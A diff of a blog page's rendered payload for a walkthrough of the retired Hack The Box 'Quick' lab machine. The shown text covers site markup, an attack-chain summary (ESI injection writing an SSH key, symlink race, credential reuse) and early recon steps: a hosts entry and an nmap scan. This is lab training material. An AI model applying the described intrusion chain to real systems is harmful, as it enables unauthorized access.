@@ -4,8 +4,8 @@
 4:I[8500,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-62c612da01ccb422.js"],""]
 5:I[7549,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-62c612da01ccb422.js"],"MobileNavigation"]
 12:I[7123,[],"default",1]
-:HL["/_next/static/css/2377371a6300f138.css","style"]
-0:{"P":null,"c":["","writing","hackthebox-quick-walkthrough",""],"q":"","i":false,"f":[[["",{"children":["writing",{"children":[["slug","hackthebox-quick-walkthrough","d",null],{"children":["__PAGE__",{}]}]}]},"$undefined","$undefined",16],[["$","$1","c",{"children":[[["$","link","0",{"rel":"stylesheet","href":"/_next/static/css/2377371a6300f138.css","precedence":"next","crossOrigin":"$undefined","nonce":"$undefined"}]],["$","html",null,{"lang":"en","children":[["$","head",null,{"children":["$","link",null,{"rel":"alternate","type":"application/rss+xml","href":"/feed.xml","title":"CyberKareem security writing"}]}],["$","body",null,{"children":[["$","$L2",null,{"parallelRouterKey":"children","error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L3",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":[[[["$","a",null,{"className":"skip-link","href":"#main-content","children":"Skip to content"}],["$","header",null,{"className":"site-header","children":["$","div",null,{"className":"shell header-inner","children":[["$","$L4",null,{"className":"brand","href":"/","aria-label":"CyberKareem home","children":[["$","span",null,{"className":"brand-mark","aria-hidden":"true","children":"CK"}],["$","span",null,{"children":"CyberKareem"}]]}],["$","nav",null,{"className":"desktop-nav","aria-label":"Primary navigation","children":[["$","$L4","/research",{"href":"/research","aria-current":"$undefined","children":"Research"}],["$","$L4","/services",{"href":"/services","aria-current":"$undefined","children":"Services"}],["$","$L4","/writing",{"href":"/writing","aria-current":"$undefined","children":"Writing"}],["$","$L4","/projects",{"href":"/projects","aria-current":"$undefined","children":"Projects"}],["$","$L4","/about",{"href":"/about","aria-current":"$undefined","children":"About"}],["$","$L4","/contact",{"href":"/contact","aria-current":"$undefined","children":"Contact"}]]}],["$","$L4",null,{"className":"utility-link","href":"/contact#assessment-enquiries","children":["Start an assessment ",["$","span",null,{"aria-hidden":"true","children":"→"}]]}],["$","$L5",null,{"items":[{"label":"Research","href":"/research"},{"label":"Services","href":"/services"},{"label":"Writing","href":"/writing"},{"label":"Projects","href":"/projects"},{"label":"About","href":"/about"},{"label":"Contact","href":"/contact"}],"activePath":"$undefined"}]]}]}]],["$","main",null,{"id":"main-content","tabIndex":-1,"className":"subpage-main","children":["$","section",null,{"className":"page-hero shell","aria-labelledby":"not-found-title","children":[["$","p",null,{"className":"page-eyebrow","children":"Error record · 404"}],["$","h1",null,{"id":"not-found-title","children":["This page has left the ",["$","em",null,{"children":"record."}]]}],["$","div",null,{"className":"page-intro-grid","children":[["$","div",null,{"className":"page-intro-copy","children":[["$","p",null,{"children":"The address may have changed, or the page may no longer be public. The research ledger and owned writing archive remain available from their permanent indexes."}],["$","div",null,{"className":"page-actions","children":[["$","$L4",null,{"className":"button button-primary","href":"/","children":["Return home ",["$","span",null,{"aria-hidden":"true","children":"→"}]]}],["$","$L4",null,{"className":"button button-secondary","href":"/writing","children":"Browse the writing archive"}]]}]]}],["$","div",null,{"className":"contact-guardrail","role":"note","children":[["$","span",null,{"children":"Looking for evidence?"}],["$","p",null,{"children":"Open the public research ledger for current advisory and CVE records linked to their primary sources."}],["$","$L4",null,{"className":"text-link","href":"/research","children":["Open research ledger ",["$","span",null,{"aria-hidden":"true","children":"→"}]]}]]}]]}]]}]}],["$","footer",null,{"className":"site-footer","children":[["$","div",null,{"className":"shell footer-main","children":[["$","div",null,{"children":[["$","$L4",null,{"className":"brand footer-brand","href":"/","children":[["$","span",null,{"className":"brand-mark","aria-hidden":"true","children":"CK"}],["$","span",null,{"children":"CyberKareem"}]]}],["$","p",null,{"children":"Abdullah Kareem · Security Researcher and Penetration Tester"}]]}],["$","div",null,{"className":"footer-link-groups","children":[["$","nav",null,{"className":"footer-site-nav","aria-label":"Site pages","children":[["$","$L4","Research",{"href":"/research","children":"Research"}],["$","$L4","Services",{"href":"/services","children":"Services"}],["$","$L4","Writing",{"href":"/writing","children":"Writing"}],["$","$L4","Projects",{"href":"/projects","children":"Projects"}],["$","$L4","About",{"href":"/about","children":"About"}],["$","$L4","Contact",{"href":"/contact","children":"Contact"}],["$","$L4","Policies",{"href":"/policies","children":"Policies"}]]}],["$","nav",null,{"className":"social-links","aria-label":"Contact and public profiles","children":["$L6","$L7","$L8","$L9","$La"]}]]}]]}],"$Lb"]}]],[]],"forbidden":"$undefined","unauthorized":"$undefined"}],"$Lc"]}]]}]]}],{"children":["$Ld",{"children":["$Le",{"children":["$Lf",{},null,false,null]},null,false,"$@10"]},null,false,"$@10"]},null,false,null],"$L11",false]],"m":"$undefined","G":["$12",[]],"S":true,"h":null,"s":"$undefined","l":"$undefined","p":"$undefined","d":"$undefined","b":"zs2c_HJI2CXWwLDIPVraL"}
+:HL["/_next/static/css/8149d5cedd00bf59.css","style"]
+0:{"P":null,"c":["","writing","hackthebox-quick-walkthrough",""],"q":"","i":false,"f":[[["",{"children":["writing",{"children":[["slug","hackthebox-quick-walkthrough","d",null],{"children":["__PAGE__",{}]}]}]},"$undefined","$undefined",16],[["$","$1","c",{"children":[[["$","link","0",{"rel":"stylesheet","href":"/_next/static/css/8149d5cedd00bf59.css","precedence":"next","crossOrigin":"$undefined","nonce":"$undefined"}]],["$","html",null,{"lang":"en","children":[["$","head",null,{"children":["$","link",null,{"rel":"alternate","type":"application/rss+xml","href":"/feed.xml","title":"CyberKareem security writing"}]}],["$","body",null,{"children":[["$","$L2",null,{"parallelRouterKey":"children","error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L3",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":[[[["$","a",null,{"className":"skip-link","href":"#main-content","children":"Skip to content"}],["$","header",null,{"className":"site-header","children":["$","div",null,{"className":"shell header-inner","children":[["$","$L4",null,{"className":"brand","href":"/","aria-label":"CyberKareem home","children":[["$","span",null,{"className":"brand-mark","aria-hidden":"true","children":"CK"}],["$","span",null,{"children":"CyberKareem"}]]}],["$","nav",null,{"className":"desktop-nav","aria-label":"Primary navigation","children":[["$","$L4","/research",{"href":"/research","aria-current":"$undefined","children":"Research"}],["$","$L4","/services",{"href":"/services","aria-current":"$undefined","children":"Services"}],["$","$L4","/writing",{"href":"/writing","aria-current":"$undefined","children":"Writing"}],["$","$L4","/projects",{"href":"/projects","aria-current":"$undefined","children":"Projects"}],["$","$L4","/about",{"href":"/about","aria-current":"$undefined","children":"About"}],["$","$L4","/contact",{"href":"/contact","aria-current":"$undefined","children":"Contact"}]]}],["$","$L4",null,{"className":"utility-link","href":"/contact#assessment-enquiries","children":["Start an assessment ",["$","span",null,{"aria-hidden":"true","children":"→"}]]}],["$","$L5",null,{"items":[{"label":"Research","href":"/research"},{"label":"Services","href":"/services"},{"label":"Writing","href":"/writing"},{"label":"Projects","href":"/projects"},{"label":"About","href":"/about"},{"label":"Contact","href":"/contact"}],"activePath":"$undefined"}]]}]}]],["$","main",null,{"id":"main-content","tabIndex":-1,"className":"subpage-main","children":["$","section",null,{"className":"page-hero shell","aria-labelledby":"not-found-title","children":[["$","p",null,{"className":"page-eyebrow","children":"Error record · 404"}],["$","h1",null,{"id":"not-found-title","children":["This page has left the ",["$","em",null,{"children":"record."}]]}],["$","div",null,{"className":"page-intro-grid","children":[["$","div",null,{"className":"page-intro-copy","children":[["$","p",null,{"children":"The address may have changed, or the page may no longer be public. The research ledger and owned writing archive remain available from their permanent indexes."}],["$","div",null,{"className":"page-actions","children":[["$","$L4",null,{"className":"button button-primary","href":"/","children":["Return home ",["$","span",null,{"aria-hidden":"true","children":"→"}]]}],["$","$L4",null,{"className":"button button-secondary","href":"/writing","children":"Browse the writing archive"}]]}]]}],["$","div",null,{"className":"contact-guardrail","role":"note","children":[["$","span",null,{"children":"Looking for evidence?"}],["$","p",null,{"children":"Open the public research ledger for current advisory and CVE records linked to their primary sources."}],["$","$L4",null,{"className":"text-link","href":"/research","children":["Open research ledger ",["$","span",null,{"aria-hidden":"true","children":"→"}]]}]]}]]}]]}]}],["$","footer",null,{"className":"site-footer","children":[["$","div",null,{"className":"shell footer-main","children":[["$","div",null,{"children":[["$","$L4",null,{"className":"brand footer-brand","href":"/","children":[["$","span",null,{"className":"brand-mark","aria-hidden":"true","children":"CK"}],["$","span",null,{"children":"CyberKareem"}]]}],["$","p",null,{"children":"Abdullah Kareem · Security Researcher and Penetration Tester"}]]}],["$","div",null,{"className":"footer-link-groups","children":[["$","nav",null,{"className":"footer-site-nav","aria-label":"Site pages","children":[["$","$L4","Research",{"href":"/research","children":"Research"}],["$","$L4","Services",{"href":"/services","children":"Services"}],["$","$L4","Writing",{"href":"/writing","children":"Writing"}],["$","$L4","Projects",{"href":"/projects","children":"Projects"}],["$","$L4","About",{"href":"/about","children":"About"}],["$","$L4","Contact",{"href":"/contact","children":"Contact"}],["$","$L4","Policies",{"href":"/policies","children":"Policies"}]]}],["$","nav",null,{"className":"social-links","aria-label":"Contact and public profiles","children":["$L6","$L7","$L8","$L9","$La"]}]]}]]}],"$Lb"]}]],[]],"forbidden":"$undefined","unauthorized":"$undefined"}],"$Lc"]}]]}]]}],{"children":["$Ld",{"children":["$Le",{"children":["$Lf",{},null,false,null]},null,false,"$@10"]},null,false,"$@10"]},null,false,null],"$L11",false]],"m":"$undefined","G":["$12",[]],"S":true,"h":null,"s":"$undefined","l":"$undefined","p":"$undefined","d":"$undefined","b":"EBRi0HxexS1XMGpfUl_9d"}
 15:I[484,[],"OutletBoundary"]
 16:"$Sreact.suspense"
 19:I[484,[],"ViewportBoundary"]
@@ -24,93 +24,90 @@ f:["$","$1","c",{"children":["$L14",null,["$","$L15",null,{"children":["$","$16"
 10:"$W18"
 11:["$","$1","h",{"children":[null,["$","$L19",null,{"children":"$L1a"}],["$","div",null,{"hidden":true,"children":["$","$L1b",null,{"children":["$","$16",null,{"name":"Next.Metadata","children":"$L1c"}]}]}],null]}]
 :HL["/writing/covers/hackthebox-quick-walkthrough.webp","image"]
-14:[[["$","a",null,{"className":"skip-link","href":"#main-content","children":"Skip to content"}],["$","header",null,{"className":"site-header","children":["$","div",null,{"className":"shell header-inner","children":[["$","$L4",null,{"className":"brand","href":"/","aria-label":"CyberKareem home","children":[["$","span",null,{"className":"brand-mark","aria-hidden":"true","children":"CK"}],["$","span",null,{"children":"CyberKareem"}]]}],["$","nav",null,{"className":"desktop-nav","aria-label":"Primary navigation","children":[["$","$L4","/research",{"href":"/research","aria-current":"$undefined","children":"Research"}],["$","$L4","/services",{"href":"/services","aria-current":"$undefined","children":"Services"}],["$","$L4","/writing",{"href":"/writing","aria-current":"page","children":"Writing"}],["$","$L4","/projects",{"href":"/projects","aria-current":"$undefined","children":"Projects"}],["$","$L4","/about",{"href":"/about","aria-current":"$undefined","children":"About"}],["$","$L4","/contact",{"href":"/contact","aria-current":"$undefined","children":"Contact"}]]}],["$","$L4",null,{"className":"utility-link","href":"/contact#assessment-enquiries","children":["Start an assessment ",["$","span",null,{"aria-hidden":"true","children":"→"}]]}],["$","$L5",null,{"items":["$0:f:0:1:0:props:children:1:props:children:1:props:children:0:props:notFound:0:0:1:props:children:props:children:3:props:items:0","$0:f:0:1:0:props:children:1:props:children:1:props:children:0:props:notFound:0:0:1:props:children:props:children:3:props:items:1","$0:f:0:1:0:props:children:1:props:children:1:props:children:0:props:notFound:0:0:1:props:children:props:children:3:props:items:2","$0:f:0:1:0:props:children:1:props:children:1:props:children:0:props:notFound:0:0:1:props:children:props:children:3:props:items:3","$0:f:0:1:0:props:children:1:props:children:1:props:children:0:props:notFound:0:0:1:props:children:props:children:3:props:items:4","$0:f:0:1:0:props:children:1:props:children:1:props:children:0:props:notFound:0:0:1:props:children:props:children:3:props:items:5"],"activePath":"/writing"}]]}]}]],["$","main",null,{"id":"main-content","tabIndex":-1,"className":"article-main","children":[["$","article",null,{"className":"writing-article","children":[["$","header",null,{"className":"article-hero shell","children":[["$","nav",null,{"className":"article-breadcrumb","aria-label":"Breadcrumb","children":[["$","$L4",null,{"href":"/writing","children":"Writing archive"}],["$","span",null,{"aria-hidden":"true","children":"/"}],["$","span",null,{"children":"Hack The Box"}]]}],["$","p",null,{"className":"page-eyebrow","children":"Hack The Box"}],["$","h1",null,{"children":"Hack The Box: Quick Walkthrough"}],["$","p",null,{"className":"article-dek","children":"An archived walkthrough of the retired Hack The Box Quick machine, preserved from Abdullah Kareem's OSWE Prep preparation notes."}],["$","dl",null,{"className":"article-meta","children":[["$","div",null,{"children":[["$","dt",null,{"children":"Published"}],["$","dd",null,{"children":["$","time",null,{"dateTime":"2026-06-11T12:03:27.000Z","children":"11 Jun 2026"}]}]]}],["$","div",null,{"children":[["$","dt",null,{"children":"Reading time"}],["$","dd",null,{"children":[13," minutes"]}]]}],null,["$","div",null,{"children":[["$","dt",null,{"children":"Author"}],["$","dd",null,{"children":"Abdullah Kareem"}]]}]]}],["$","figure",null,{"className":"article-cover article-cover-machine","children":[["$","div",null,{"className":"article-cover-art","children":["$","img",null,{"src":"/writing/covers/hackthebox-quick-walkthrough.webp","width":300,"height":300,"alt":"Hack The Box Quick machine avatar","decoding":"async"}]}],["$","figcaption",null,{"children":[["$","span",null,{"children":"Official Quick machine artwork, used for identification. Hack The Box is not affiliated with this archive."}],["$","a",null,{"href":"https://app.hackthebox.com/machines/quick","target":"_blank","rel":"nofollow noopener noreferrer","children":["Hack The Box machine artwork"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}]]}]]}]]}]]}],["$","div",null,{"className":"article-rule"}],["$","div",null,{"className":"article-layout shell","children":[["$","aside",null,{"className":"article-context","aria-label":"Article provenance and review context","children":[[["$","nav",null,{"className":"article-toc article-toc-desktop","aria-label":"Article sections","children":[["$","span",null,{"children":"On this page"}],["$","ol",null,{"children":[["$","li","mindset-and-methodology",{"children":["$","a",null,{"href":"#mindset-and-methodology","children":"Mindset & Methodology"}]}],["$","li","phase-1-enumeration",{"children":["$","a",null,{"href":"#phase-1-enumeration","children":"Phase 1: Enumeration"}]}],["$","li","phase-2-initial-foothold-user",{"children":["$","a",null,{"href":"#phase-2-initial-foothold-user","children":"Phase 2: Initial Foothold (User)"}]}],["$","li","phase-3-privilege-escalation-to-srvadm",{"children":["$","a",null,{"href":"#phase-3-privilege-escalation-to-srvadm","children":"Phase 3: Privilege Escalation to srvadm"}]}],["$","li","phase-4-root",{"children":["$","a",null,{"href":"#phase-4-root","children":"Phase 4: Root"}]}],["$","li","key-lessons-and-takeaways",{"children":["$","a",null,{"href":"#key-lessons-and-takeaways","children":"Key Lessons & Takeaways"}]}]]}]]}],["$","details",null,{"className":"article-toc article-toc-mobile","children":["$L1d","$L1e"]}]],"$L1f","$L20",["$L21","$L22","$L23"]]}],"$L24"]}]]}],"$L25"]}],"$L26","$L27"]
-1d:["$","summary",null,{"children":["On this page · ",6," sections"]}]
-1e:["$","nav",null,{"aria-label":"Article sections","children":["$","ol",null,{"children":[["$","li","mindset-and-methodology",{"children":["$","a",null,{"href":"#mindset-and-methodology","children":"Mindset & Methodology"}]}],["$","li","phase-1-enumeration",{"children":["$","a",null,{"href":"#phase-1-enumeration","children":"Phase 1: Enumeration"}]}],["$","li","phase-2-initial-foothold-user",{"children":["$","a",null,{"href":"#phase-2-initial-foothold-user","children":"Phase 2: Initial Foothold (User)"}]}],["$","li","phase-3-privilege-escalation-to-srvadm",{"children":["$","a",null,{"href":"#phase-3-privilege-escalation-to-srvadm","children":"Phase 3: Privilege Escalation to srvadm"}]}],["$","li","phase-4-root",{"children":["$","a",null,{"href":"#phase-4-root","children":"Phase 4: Root"}]}],["$","li","key-lessons-and-takeaways",{"children":["$","a",null,{"href":"#key-lessons-and-takeaways","children":"Key Lessons & Takeaways"}]}]]}]}]
-1f:["$","div",null,{"className":"article-provenance","children":[["$","span",null,{"children":"Archive provenance"}],[["$","p",null,{"children":["Archived from public GitHub preparation notes"," on ","11 Jun 2026",". Added to CyberKareem on ","12 Jul 2026","."]}],["$","a",null,{"href":"https://github.com/CyberKareem/OSWE-Prep/blob/92f7186f5c251e8b686633cee2d22e64f4fd7934/HTB-Quick.md","target":"_blank","rel":"nofollow noopener noreferrer","children":["Immutable source revision ",["$","span",null,{"aria-hidden":"true","children":"↗"}]]}],["$","small",null,{"children":["CyberKareem/OSWE-Prep"," · 92f7186f5c25",""]}]]]}]
-20:["$","div",null,{"className":"article-review-note article-review-lab-archive","children":[["$","span",null,{"children":"Official machine record"}],["$","p",null,{"children":["Quick"," · Linux"," · Hard"," · Retired status verified 12 Jul 2026","."]}],["$","a",null,{"href":"https://app.hackthebox.com/machines/quick","target":"_blank","rel":"nofollow noopener noreferrer","children":["Open Hack The Box profile ",["$","span",null,{"aria-hidden":"true","children":"↗"}]]}]]}]
+14:[[["$","a",null,{"className":"skip-link","href":"#main-content","children":"Skip to content"}],["$","header",null,{"className":"site-header","children":["$","div",null,{"className":"shell header-inner","children":[["$","$L4",null,{"className":"brand","href":"/","aria-label":"CyberKareem home","children":[["$","span",null,{"className":"brand-mark","aria-hidden":"true","children":"CK"}],["$","span",null,{"children":"CyberKareem"}]]}],["$","nav",null,{"className":"desktop-nav","aria-label":"Primary navigation","children":[["$","$L4","/research",{"href":"/research","aria-current":"$undefined","children":"Research"}],["$","$L4","/services",{"href":"/services","aria-current":"$undefined","children":"Services"}],["$","$L4","/writing",{"href":"/writing","aria-current":"page","children":"Writing"}],["$","$L4","/projects",{"href":"/projects","aria-current":"$undefined","children":"Projects"}],["$","$L4","/about",{"href":"/about","aria-current":"$undefined","children":"About"}],["$","$L4","/contact",{"href":"/contact","aria-current":"$undefined","children":"Contact"}]]}],["$","$L4",null,{"className":"utility-link","href":"/contact#assessment-enquiries","children":["Start an assessment ",["$","span",null,{"aria-hidden":"true","children":"→"}]]}],["$","$L5",null,{"items":["$0:f:0:1:0:props:children:1:props:children:1:props:children:0:props:notFound:0:0:1:props:children:props:children:3:props:items:0","$0:f:0:1:0:props:children:1:props:children:1:props:children:0:props:notFound:0:0:1:props:children:props:children:3:props:items:1","$0:f:0:1:0:props:children:1:props:children:1:props:children:0:props:notFound:0:0:1:props:children:props:children:3:props:items:2","$0:f:0:1:0:props:children:1:props:children:1:props:children:0:props:notFound:0:0:1:props:children:props:children:3:props:items:3","$0:f:0:1:0:props:children:1:props:children:1:props:children:0:props:notFound:0:0:1:props:children:props:children:3:props:items:4","$0:f:0:1:0:props:children:1:props:children:1:props:children:0:props:notFound:0:0:1:props:children:props:children:3:props:items:5"],"activePath":"/writing"}]]}]}]],["$","main",null,{"id":"main-content","tabIndex":-1,"className":"article-main","children":[["$","article",null,{"className":"writing-article","children":[["$","header",null,{"className":"article-hero shell","children":[["$","nav",null,{"className":"article-breadcrumb","aria-label":"Breadcrumb","children":[["$","$L4",null,{"href":"/writing","children":"Writing archive"}],["$","span",null,{"aria-hidden":"true","children":"/"}],["$","span",null,{"children":"Hack The Box"}]]}],["$","p",null,{"className":"page-eyebrow","children":"Hack The Box"}],["$","h1",null,{"children":"Hack The Box: Quick Walkthrough"}],["$","p",null,{"className":"article-dek","children":"HTTP/3 documentation supplied a default password, a stored ESI payload wrote an SSH key for Sam, and a symlink race in the internal printer service pivoted to srvadm, whose saved printer credential was reused for root."}],["$","dl",null,{"className":"article-meta","children":[["$","div",null,{"children":[["$","dt",null,{"children":"Published"}],["$","dd",null,{"children":["$","time",null,{"dateTime":"2026-06-11T12:03:27.000Z","children":"11 Jun 2026"}]}]]}],["$","div",null,{"children":[["$","dt",null,{"children":"Reading time"}],["$","dd",null,{"children":[13," minutes"]}]]}],null,["$","div",null,{"children":[["$","dt",null,{"children":"Author"}],["$","dd",null,{"children":"Abdullah Kareem"}]]}]]}],["$","figure",null,{"className":"article-cover article-cover-machine","children":[["$","div",null,{"className":"article-cover-art","children":["$","img",null,{"src":"/writing/covers/hackthebox-quick-walkthrough.webp","width":300,"height":300,"alt":"Hack The Box Quick machine avatar","decoding":"async"}]}],["$","figcaption",null,{"children":[["$","span",null,{"children":"Official Quick machine artwork, used for identification. Hack The Box is not affiliated with this archive."}],["$","a",null,{"href":"https://app.hackthebox.com/machines/quick","target":"_blank","rel":"nofollow noopener noreferrer","children":"Hack The Box machine artwork"}]]}]]}]]}],["$","div",null,{"className":"article-rule"}],["$","div",null,{"className":"article-layout shell","children":[["$","aside",null,{"className":"article-context","aria-label":"Article provenance and review context","children":[[["$","nav",null,{"className":"article-toc article-toc-desktop","aria-label":"Article sections","children":[["$","span",null,{"children":"On this page"}],["$","ol",null,{"children":[["$","li","attack-chain",{"children":["$","a",null,{"href":"#attack-chain","children":"Attack chain"}]}],["$","li","phase-1-enumeration",{"children":["$","a",null,{"href":"#phase-1-enumeration","children":"Phase 1: Enumeration"}]}],["$","li","phase-2-initial-foothold-user",{"children":["$","a",null,{"href":"#phase-2-initial-foothold-user","children":"Phase 2: Initial Foothold (User)"}]}],["$","li","phase-3-privilege-escalation-to-srvadm",{"children":["$","a",null,{"href":"#phase-3-privilege-escalation-to-srvadm","children":"Phase 3: Privilege Escalation to srvadm"}]}],["$","li","phase-4-root",{"children":["$","a",null,{"href":"#phase-4-root","children":"Phase 4: Root"}]}],["$","li","key-lessons-and-takeaways",{"children":["$","a",null,{"href":"#key-lessons-and-takeaways","children":"Key Lessons & Takeaways"}]}]]}]]}],["$","details",null,{"className":"article-toc article-toc-mobile","children":["$L1d","$L1e"]}]],"$L1f","$L20",["$L21","$L22","$L23"]]}],"$L24"]}]]}],"$L25"]}],"$L26","$L27"]
+1d:["$","summary",null,{"children":["On this page (",6," sections)"]}]
+1e:["$","nav",null,{"aria-label":"Article sections","children":["$","ol",null,{"children":[["$","li","attack-chain",{"children":["$","a",null,{"href":"#attack-chain","children":"Attack chain"}]}],["$","li","phase-1-enumeration",{"children":["$","a",null,{"href":"#phase-1-enumeration","children":"Phase 1: Enumeration"}]}],["$","li","phase-2-initial-foothold-user",{"children":["$","a",null,{"href":"#phase-2-initial-foothold-user","children":"Phase 2: Initial Foothold (User)"}]}],["$","li","phase-3-privilege-escalation-to-srvadm",{"children":["$","a",null,{"href":"#phase-3-privilege-escalation-to-srvadm","children":"Phase 3: Privilege Escalation to srvadm"}]}],["$","li","phase-4-root",{"children":["$","a",null,{"href":"#phase-4-root","children":"Phase 4: Root"}]}],["$","li","key-lessons-and-takeaways",{"children":["$","a",null,{"href":"#key-lessons-and-takeaways","children":"Key Lessons & Takeaways"}]}]]}]}]
+1f:["$","div",null,{"className":"article-provenance","children":[["$","span",null,{"children":"Source"}],[["$","p",null,{"children":["Archived from public GitHub preparation notes on ","11 Jun 2026",". Added to CyberKareem on ","12 Jul 2026","."]}],["$","a",null,{"href":"https://github.com/CyberKareem/OSWE-Prep/blob/92f7186f5c251e8b686633cee2d22e64f4fd7934/HTB-Quick.md","target":"_blank","rel":"nofollow noopener noreferrer","children":"Immutable source revision"}],["$","small",null,{"children":["CyberKareem/OSWE-Prep",", commit 92f7186f5c25",""]}]]]}]
+20:["$","div",null,{"className":"article-review-note article-review-lab-archive","children":[["$","span",null,{"children":"Official machine record"}],["$","p",null,{"children":["Quick, Linux, Hard",". Retired status verified ","12 Jul 2026","."]}],["$","a",null,{"href":"https://app.hackthebox.com/machines/quick","target":"_blank","rel":"nofollow noopener noreferrer","children":"Open Hack The Box profile"}]]}]
 21:["$","div","lab-archive-0",{"className":"article-review-note article-review-lab-archive","children":[["$","span",null,{"children":"Archived, authorized retired-lab walkthrough"}],["$","p",null,{"children":"This personal lab note documents the officially retired Hack The Box Quick machine. Retired status was verified on 12 July 2026. Use the techniques only on systems you own or have explicit permission to test."}],null]}]
-22:["$","div","source-context-1",{"className":"article-review-note article-review-source-context","children":[["$","span",null,{"children":"GitHub archive context"}],["$","p",null,{"children":"Imported mechanically from Abdullah Kareem's public preparation notes. Commands and claims reflect the archived lab and tool versions; this page does not add new solution steps or imply Hack The Box endorsement."}],null]}]
-23:["$","div","editorial-correction-2",{"className":"article-review-note article-review-editorial-correction","children":[["$","span",null,{"children":"Reusable artifacts removed"}],["$","p",null,{"children":"11 redacted retired-lab artifact occurrences were replaced with descriptive placeholders while preserving the attack method, including credentials, keys, tickets, hashes, flags, private links, or encoded material."}],null]}]
-28:T6e22,
-<p><strong>Machine:</strong> Quick<br /><strong>Difficulty:</strong> Hard<br /><strong>OS:</strong> Linux<br /><strong>IP (Target):</strong> 10.129.2.152<br /><strong>IP (Attacker):</strong> 10.10.14.6  </p>
-<hr />
+22:["$","div","source-context-1",{"className":"article-review-note article-review-source-context","children":[["$","span",null,{"children":"GitHub archive context"}],["$","p",null,{"children":"Imported from Abdullah Kareem's public preparation notes and lightly copy-edited for clarity. Commands and technical claims remain tied to the archived lab and tool versions; this page does not add new solution steps or imply Hack The Box endorsement."}],null]}]
+23:["$","div","editorial-correction-2",{"className":"article-review-note article-review-editorial-correction","children":[["$","span",null,{"children":"Reusable artifacts removed"}],["$","p",null,{"children":"9 redacted retired-lab artifact occurrences were replaced with descriptive placeholders while preserving the attack method, including credentials, keys, tickets, hashes, flags, private links, or encoded material."}],null]}]
+28:T6a07,<p><strong>Machine:</strong> Quick<br><strong>Difficulty:</strong> Hard<br><strong>OS:</strong> Linux<br><strong>IP (Target):</strong> 10.129.2.152<br><strong>IP (Attacker):</strong> 10.10.14.6  </p>
+<hr>
 
 
 
-<h2 id="mindset-and-methodology">Mindset &amp; Methodology</h2>
-<p>Before touching a single command, understand the <strong>hacker's mindset</strong> for this box:</p>
-<blockquote>
-<p><strong>"The box is called Quick. The name is a hint."</strong></p>
-</blockquote>
-<p>On HackTheBox, machine names are rarely random. "Quick" hints at speed, but more importantly, it hints at <strong>HTTP/3</strong> and the <strong>QUIC protocol</strong> — both designed for speed. When you see an HTTPS link that doesn't work on standard TCP port 443, you must ask: <em>"What if this isn't broken? What if it's just speaking a protocol I haven't checked yet?"</em></p>
+<h2 id="attack-chain">Attack chain</h2>
+<p>Start by mapping the likely attack paths:</p>
+
+<p>On HackTheBox, machine names are rarely random. "Quick" hints at speed, but more importantly, it hints at <strong>HTTP/3</strong> and the <strong>QUIC protocol</strong> - both designed for speed. When you see an HTTPS link that doesn't work on standard TCP port 443, you must ask: <em>"What if this isn't broken? What if it's just speaking a protocol I haven't checked yet?"</em></p>
 <p>The core methodology for this box is:</p>
 <ol>
-<li><strong>Enumerate everything</strong> — even the weird stuff (UDP ports, non-standard protocols).</li>
-<li><strong>Follow the breadcrumbs</strong> — PDFs, testimonials, and email addresses are not decoration; they are intel.</li>
-<li><strong>Think like the developer</strong> — they reused passwords, left debug headers (<code>X-Powered-By: Esigate</code>), and stored credentials in config files.</li>
-<li><strong>Use the path of least resistance</strong> — whenever possible, write your own access (SSH keys) instead of fighting with reverse shells.</li>
+<li><strong>Enumerate everything</strong> : even the weird stuff (UDP ports, non-standard protocols).</li>
+<li><strong>Follow the breadcrumbs</strong> : PDFs, testimonials, and email addresses are not decoration; they are intel.</li>
+<li><strong>Review the implementation</strong> : they reused passwords, left debug headers (<code>X-Powered-By: Esigate</code>), and stored credentials in config files.</li>
+<li><strong>Use the path of least resistance</strong> : whenever possible, write your own access (SSH keys) instead of fighting with reverse shells.</li>
 </ol>
-<hr />
+<hr>
 <h2 id="phase-1-enumeration">Phase 1: Enumeration</h2>
 <h3 id="step-1-1-hosts-file-setup">Step 1.1: Hosts File Setup</h3>
 <p><strong>Command:</strong></p>
 <pre><code class="language-bash" data-language="bash">echo -e "10.129.2.152\tquick.htb portal.quick.htb printerv2.quick.htb" | sudo tee -a /etc/hosts
 </code></pre>
-<p><strong>Why:</strong><br />Web applications often use <strong>virtual hosts</strong> (vhosts). If you access a site by IP address alone, Apache/nginx serves the <em>default</em> virtual host. To reach <code>portal.quick.htb</code> or <code>printerv2.quick.htb</code>, your OS must resolve those domains to the target IP. Without this, you'll hit the wrong site or get connection errors.</p>
-<p><strong>Hacker Mindset:</strong><br /><em>Always map domains early.</em> The moment you see a link to <code>portal.quick.htb</code> on the main page, that domain becomes a target. Don't wait until you need it — set it up during initial recon.</p>
-<hr />
+<p><strong>Why:</strong><br>Web applications often use <strong>virtual hosts</strong> (vhosts). If you access a site by IP address alone, Apache/nginx serves the <em>default</em> virtual host. To reach <code>portal.quick.htb</code> or <code>printerv2.quick.htb</code>, your OS must resolve those domains to the target IP. Without this, you'll hit the wrong site or get connection errors.</p>
+<p><br><em>Always map domains early.</em> The moment you see a link to <code>portal.quick.htb</code> on the main page, that domain becomes a target. Don't wait until you need it - set it up during initial recon.</p>
+<hr>
 <h3 id="step-1-2-nmap-what-we-expect">Step 1.2: Nmap (What We Expect)</h3>
 <p>A standard <code>nmap -sC -sV</code> scan reveals:</p>
 <ul>
-<li><strong>Port 22/tcp</strong> — SSH (OpenSSH 7.6p1)</li>
-<li><strong>Port 9001/tcp</strong> — Apache httpd 2.4.29</li>
+<li><strong>Port 22/tcp</strong> : SSH (OpenSSH 7.6p1)</li>
+<li><strong>Port 9001/tcp</strong> : Apache httpd 2.4.29</li>
 </ul>
-<p><strong>Why:</strong><br />Port 9001 is non-standard for HTTP. This tells us the admin deliberately chose not to use port 80/8080. Why? Probably to hide something, or because port 80 is reserved for an internal service (spoiler: it is).</p>
-<p><strong>Hacker Mindset:</strong><br /><em>Non-standard ports are invitations to dig deeper.</em> They suggest custom configuration, potential misconfiguration, or hidden services. Also, SSH on port 22 is "boring" until you have credentials — so prioritize the webapp.</p>
-<hr />
